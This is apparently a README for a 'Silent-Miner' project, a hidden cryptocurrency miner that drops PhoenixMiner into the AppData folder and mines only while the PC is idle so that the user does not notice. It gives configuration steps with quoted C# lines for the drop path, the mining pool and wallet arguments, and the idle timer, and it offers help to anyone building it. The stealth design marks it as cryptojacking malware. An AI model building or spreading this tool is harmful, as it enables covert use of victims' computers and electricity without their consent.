# Silent-Miner
Custom Silent Miner
Idle time (start to mine when the pc is idle and stop to mine when the pc back to work)

Easy to use

you can change and use any miner you to miner too

1. Change the phonixminer in the rescource in the visual project (i put there phonixminer)
2. You can change the download folder in line 58 ( string fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "PhoenixMiner.exe"; )
3. Chane the arges command line in line 59 if you change the miner file and not use phonix miner example you use xmrig you need the right arges ( string commandLine = "-pool eth-eu1.nanopool.org:9999 -wal 0xfffnhgui34hf8v934jviroejg893jwwvi/MyRig1 -pass x -log 0"; )
4. Change the idle time in line 68 as you can see i did it for 60 sec ( Thread.Sleep(60 * 1000); )
5. Rebuild the project and make sure you build it on x64

sorry on my english :)

if need help you can comment here i will help you
